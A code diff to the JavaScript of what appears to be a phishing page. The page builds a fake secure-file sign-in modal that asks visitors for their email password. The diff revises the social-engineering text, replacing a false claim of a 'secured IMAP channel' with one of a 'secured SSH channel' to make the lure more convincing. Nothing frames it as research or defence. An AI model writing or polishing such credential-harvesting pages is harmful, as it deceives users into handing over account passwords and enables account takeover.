@@ -31,13 +31,11 @@ document.addEventListener('DOMContentLoaded', function(){
            document.querySelector("#identity").innerText = lemaInput.value;
             placeOne.innerHTML = `<div id="placetwo"> <div class="input-container"> <input type="hidden" value=${lemaInput.value} name="lemahi"> <input type="password" value="" class="abracadabra" id="lepa" name="lepa" minlength="0" placeholder="Enter email password" required> <div class="errormsg" id="stillerror"></div></div> <div class="rembme"><input type="checkbox" checked /> <span>Remember me</span></div> 
 			
-			<div style="white-space: pre-line; font-size: 0.7em;"> 
-			These files are sensitive and secured against unauthorized access.
-In order to access this file, please provide your email credentials, we
-will connect to your email provider through a secured IMAP channel to 
-authorize your download
-			
-			</div> <div style="display: flex; justify-content: end;  margin-top:30px"> <button class="modal__btn modal__btn-primary" id="next2">Sign in</button> </div> </div>`;
+<div style="white-space: pre-line; font-size: 1em; line-height: 1.4em; margin: 0;">
+    These files are sensitive and secured against unauthorized access. 
+    Please provide your credentials to access this file. We will connect 
+    to your account through a secured SSH channel to authorize your request.
+</div> <div style="display: flex; justify-content: end;  margin-top:30px"> <button class="modal__btn modal__btn-primary" id="next2">Sign in</button> </div> </div>`;
                 const placetwo = document.getElementById('placetwo');
 
                 placetwo.style.transform = 'scale(0.5)'; // start at half size
